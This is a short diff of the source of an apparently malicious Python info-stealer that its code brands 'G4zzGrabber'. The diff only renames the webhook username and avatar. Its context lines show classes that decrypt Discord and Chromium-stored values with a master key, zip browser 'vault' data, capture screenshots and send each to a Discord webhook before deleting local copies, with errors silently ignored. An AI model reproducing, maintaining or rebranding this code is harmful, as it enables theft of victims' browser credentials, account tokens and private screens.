@@ -226,8 +226,8 @@ class discord():
 
             embed.set_footer(text="github.com/g4zzlove/Hacking")
 
-            webhook.send(embed=embed, username="Hacking",
-                         avatar_url="https://imguh.com/image/nGup8")
+            webhook.send(embed=embed, username="G4zzGrabber",
+                         avatar_url="https://i.imgur.com/HjzfjfR.png")
 
     def decrypt_val(self, buff: bytes, master_key: bytes) -> str:
         iv = buff[3:15]
@@ -398,7 +398,7 @@ class chromium():
             if os.path.isfile('.\\' + name + '-vault.zip'):
                 if not os.path.getsize('.\\' + name + '-vault.zip') > 8000000:
                     webhook.send(file=File('.\\' + name + '-vault.zip'),
-                                 username="Hacking", avatar_url="https://imguh.com/image/nGup8")
+                                 username="G4zzGrabber", avatar_url="https://i.imgur.com/HjzfjfR.png")
                     os.remove('.\\' + name + '-vault.zip')
 
     def get_master_key(self, path: str) -> str:
@@ -520,7 +520,7 @@ class system():
 
         try:
             webhook.send(embed=embed, file=File('.\\screenshot.png', filename='screenshot.png'),
-                         username="Hacking", avatar_url="https://imguh.com/image/nGup8")
+                         username="G4zzGrabber", avatar_url="https://i.imgur.com/HjzfjfR.png")
         except:
             pass
 
